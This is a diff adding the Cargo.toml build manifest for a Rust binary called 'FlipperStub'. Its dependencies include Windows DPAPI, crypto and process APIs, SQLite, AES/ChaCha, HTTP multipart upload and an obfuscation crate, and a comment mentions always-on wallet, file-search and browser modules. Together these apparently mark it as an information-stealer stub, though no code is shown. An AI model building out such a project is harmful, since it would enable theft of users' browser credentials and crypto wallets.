@@ -1,0 +1,83 @@
+[package]
+name = "FlipperStub"
+version = "0.1.0"
+edition = "2024"
+
+[[bin]]
+name = "stub"
+path = "src/main.rs"
+
+[dependencies]
+zip = "4.3.0"
+tokio = { version = "1.46.1", features = [
+    "macros",
+    "rt",
+    "rt-multi-thread",
+    "time",
+    "full",
+] }
+anyhow = "1.0"
+reqwest = { version = "0.12", features = ["json", "blocking", "multipart"] }
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+regex = "1.10"
+base64 = "0.22"
+rusqlite = { version = "0.31", features = ["bundled"] }
+aes-gcm = "0.10.3"
+chacha20 = "0.9"
+uuid = { version = "1.6", features = ["v4"] }
+thiserror = "1.0"
+log = "0.4"
+env_logger = "0.10"
+futures = "0.3.31"
+embed-resource = "3.0.5"
+grep = "0.3.2"
+ignore = "0.4.23"
+lazy_static = "1.5.0"
+tokio-util = "0.7.15"
+once_cell = "1.21.3"
+rand = "0.9.1"
+dirs = "6.0.0"
+goldberg = "0.1.0"
+
+# [features] removed — the wallets/filesearch/browser flags were always
+# defaulted-on and never varied per build, so the per-feature gates in the
+# source are now unconditional. Re-introduce a feature here only if a build
+# truly needs to ship without one of the modules.
+
+[target.'cfg(windows)'.dependencies]
+winapi = { version = "0.3", features = [
+    "winuser",
+    "winbase",
+    "processthreadsapi",
+    "memoryapi",
+    "handleapi",
+    "wincon",
+    "dpapi",
+    "wincrypt",
+    "errhandlingapi",
+    "fileapi",
+    "namedpipeapi",
+    "synchapi",
+    "tlhelp32",
+    "winerror",
+    "minwinbase",
+    "consoleapi",
+    "shellapi",
+    "wow64apiset",
+    "processenv",
+] }
+windows = { version = "0.52", features = [
+    "Win32_Foundation",
+    "Win32_System_Memory",
+    "Win32_System_Threading",
+    "Win32_System_Diagnostics_ToolHelp",
+    "Win32_System_ProcessStatus",
+    "Win32_Security",
+    "Win32_System_SystemServices",
+] }
+
+[build-dependencies]
+embed-resource = "3.0.5"
+winres = "0.1"
+rand = "0.9.1"
